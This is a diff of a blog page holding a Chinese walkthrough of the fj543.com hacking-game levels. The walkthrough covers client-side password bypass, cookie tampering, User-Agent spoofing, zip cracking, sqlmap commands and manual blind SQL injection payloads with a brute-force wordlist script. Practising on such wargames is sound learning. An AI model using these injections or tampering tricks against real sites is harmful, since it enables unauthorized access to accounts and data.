@@ -241,7 +241,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>6.4k</span>
+              <span>6.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -266,16 +266,13 @@
 <p>提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) </p>
 </blockquote>
 <span id="more"></span>
-
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">gogogo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (pwd==<span class="string">&quot;go8990&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;OK,过关了！&quot;</span>);<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;./?level=222&quot;</span>;&#125; <span class="keyword">else</span> &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码错误！&quot;</span>);<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="title function_">focus</span>();&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>2-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=222">http://www.fj543.com/hack/?level=222</a></p>
 <blockquote>
 <p>提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) </p>
 </blockquote>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">chkPassword</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (pwd==<span class="string">&quot;&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能为空！(Input password please)&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能填东西！(Don&#x27;t input password please)&quot;</span>);&#125; <span class="comment">//无论输入什么内容,就是不让你提交！</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;./&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return chkPassword()&quot;</span>&gt;</span></span><br><span class="line">输入密码进入下一关 (Input password please)<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;act&quot;</span> <span class="attr">id</span>=<span class="string">&quot;act&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pass2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&lt;script&gt;标签里的东西改不了，将表单的<code>return chkPassword()</code>删掉即可。</p>
+<p>\<script>标签里的东西改不了，将表单的<code>return chkPassword()</code>删掉即可。</p>
 <p>3-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=3login">http://www.fj543.com/hack/?level=3login</a></p>
 <blockquote>
 <p>您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) </p>
@@ -283,26 +280,23 @@
 </blockquote>
 <p>在cookie管理器或抓包改cookie，no改成yes即可。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no</span><br></pre></td></tr></table></figure>
-
 <p>4-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=4ditdah">http://www.fj543.com/hack/?level=4ditdah</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. .</span><br><span class="line">. _</span><br><span class="line">_ _</span><br><span class="line">_ _ _</span><br><span class="line">_ . _</span><br><span class="line">提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  </span><br></pre></td></tr></table></figure>
-
 <p> 摩斯电码<code>IAMOK</code></p>
 <p>5-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=5crack">http://www.fj543.com/hack/?level=5crack</a></p>
 <blockquote>
-<p>提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw&#x3D;&#x3D;或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  </p>
+<p>提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  </p>
 </blockquote>
 <p><code>YmFzZTY0aXNvaw==</code>有大小写和等号，考虑base64<code>base64isok</code></p>
 <p><code>ad93c1d102ae60f4</code>是MD5<code>520530</code>，但用<code>520530</code>过不了关？？？</p>
 <p>6-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=6por">http://www.fj543.com/hack/?level=6por</a></p>
 <blockquote>
-<p> if mstsc+vnc&#x3D;9290 then password&#x3D;MSSQL+MySQL+Oracle<br> password&#x3D; ？</p>
+<p> if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle<br> password= ？</p>
 <p> 提示语：有些常见的数字要记住。(You should remember some numbers)  </p>
 </blockquote>
 <p>常见端口号：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc:3389</span><br><span class="line">vnc:5901</span><br><span class="line">MSSQL:1433</span><br><span class="line">MySQL:3306</span><br><span class="line">Oeacle:1521</span><br></pre></td></tr></table></figure>
-
-<p>password&#x3D;1433+3306+1521&#x3D;6260</p>
+<p>password=1433+3306+1521=6260</p>
 <p>7-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=75901">http://www.fj543.com/hack/?level=75901</a></p>
 <blockquote>
 <p>提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  </p>
@@ -316,14 +310,12 @@
 <p>吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为<code>fj573</code></p>
 <p>9-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=91ie543">http://www.fj543.com/hack/?level=91ie543</a></p>
 <blockquote>
-<p>提示语：使用IE 5.43版本的浏览器访问?level&#x3D;9token可以得到令牌。(Use IE 5.43 version to browse ?level&#x3D;9token) </p>
+<p>提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) </p>
 </blockquote>
 <p>抓包改URL和浏览器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=91ie543 HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br></pre></td></tr></table></figure>
-
 <p>改为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=9token HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43</span><br></pre></td></tr></table></figure>
-
 <p><code>您的令牌(Token):level9495216</code></p>
 <p>回到原来的URL输入令牌。</p>
 <p>10-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=g1012495216">http://www.fj543.com/hack/?level=g1012495216</a></p>
@@ -332,14 +324,13 @@
 </blockquote>
 <p>去winhex查一下是不是真加密，真加密就爆破zip，结果为<code>o0_O</code>。输入密码，执行exe程序生成口令。但当我们点击<code>aux.10.txt</code>后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#type指令打开常规方法无法打开的文件</span><br><span class="line">type \\.[txt文件的绝对路径]</span><br><span class="line">type \\.\C:\Users\dell\Desktop\10token\aux.10.txt</span><br><span class="line">你的令牌(Token):key104957591</span><br><span class="line">只在今天有效(It&#x27;s available only today)</span><br></pre></td></tr></table></figure>
-
 <p>11-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=lv11">http://www.fj543.com/hack/?level=lv11</a></p>
 <blockquote>
 <p>提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) </p>
 </blockquote>
 <p>用winhex打开看到字符串</p>
 <blockquote>
-<p>GIF89a……——————–password end,and password start——————–RIFF$WAVEfmt</p>
+<p>GIF89a……——————————password end,and password start——————————RIFF$WAVEfmt</p>
 </blockquote>
 <p>前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说<code>表情加上6688</code>，我的是微笑表情，所以<code>smile6688</code>通过。</p>
 <p>12-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=g1213495759">http://www.fj543.com/hack/?level=g1213495759</a></p>
@@ -357,8 +348,8 @@
 </blockquote>
 <p>什么都没有，就给了个临时ID，先用winhex打开看看</p>
 <blockquote>
-<p>User-Agent: Mozilla&#x2F;4.0 (compatible; HackersGameBrowser)</p>
-<p><a target="_blank" rel="noopener" href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a>  寶翄,{Nek(step1)  ?act&#x3D;step1&amp;code&#x3D;  寶翄,{孨ek(step2)  ?act&#x3D;step2&amp;code&#x3D;  step1ok step2ok</p>
+<p>User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)</p>
+<p><a target="_blank" rel="noopener" href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a>  寶翄,{Nek(step1)  ?act=step1&amp;code=  寶翄,{孨ek(step2)  ?act=step2&amp;code=  step1ok step2ok</p>
 </blockquote>
 <p>可以看到关键信息<code>?act=step1&amp;code=</code>和<code>?act=step2&amp;code=</code>，提交链接应该就是这些。</p>
 <p>先把刚才的软件临时ID构造<code>http://www.fj543.com/hack/?act=step1&amp;code=455</code>，但会出现以下错误：</p>
@@ -377,7 +368,7 @@
 <p>13-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=13sql">http://www.fj543.com/hack/?level=13sql</a></p>
 <blockquote>
 <p>你的ID是(Your ID)： 154<br>你的密码(Your password)： </p>
-<p>提示语：请从&#x2F;hack&#x2F;13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  </p>
+<p>提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  </p>
 </blockquote>
 <p>去到<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/13sql.asp">http://www.fj543.com/hack/13sql.asp</a></p>
 <blockquote>
@@ -386,13 +377,12 @@
 </blockquote>
 <p>POST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch</span><br><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch --tables</span><br></pre></td></tr></table></figure>
-
 <p>自动化注入好像不行，开始手注。</p>
 <p>输入1</p>
 <blockquote>
 <p> 数据库中有这条信息,但我不能直接告诉你密码。 </p>
 </blockquote>
-<p>输入1 and 1&#x3D;1</p>
+<p>输入1 and 1=1</p>
 <blockquote>
 <p> 数据库中有这条信息,但我不能直接告诉你密码。 </p>
 </blockquote>
@@ -400,18 +390,17 @@
 <blockquote>
 <p> 没有找到此ID对应的内容。 </p>
 </blockquote>
-<p>输入-1 or 1&#x3D;1</p>
+<p>输入-1 or 1=1</p>
 <blockquote>
 <p> 数据库中有这条信息,但我不能直接告诉你密码。 </p>
 </blockquote>
 <p>反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造<code>154 and pwd like &#39;%a%&#39;</code>，抓包，将$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。</p>
 <blockquote>
-<p>id&#x3D;154+and+pwd+like+%27%25a%25%27</p>
-<p>id&#x3D;154+and+pwd+like+%27%25$a$%25%27</p>
+<p>id=154+and+pwd+like+%27%25a%25%27</p>
+<p>id=154+and+pwd+like+%27%25$a$%25%27</p>
 </blockquote>
 <p>破解发现<code>bdguvBDGUV</code>都有，我猜密码是5个字符，不区分大小写。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;bdguv.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;bdguv&#x27;</span>, <span class="number">5</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    f.write(c+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-
 <p>回到<code>http://www.fj543.com/hack/?level=13sql</code>抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。</p>
 <p>14-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=14crack">http://www.fj543.com/hack/?level=14crack</a></p>
 <p>令牌下载下来的名字<code>file.exe.html</code>，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键-&gt;中文搜索引擎-&gt;智能搜索</p>
@@ -599,12 +588,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">652k</span>
+    <span title="站点总字数">649k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">9:53</span>
+    <span title="站点阅读时长">9:50</span>
 </div>
 
         
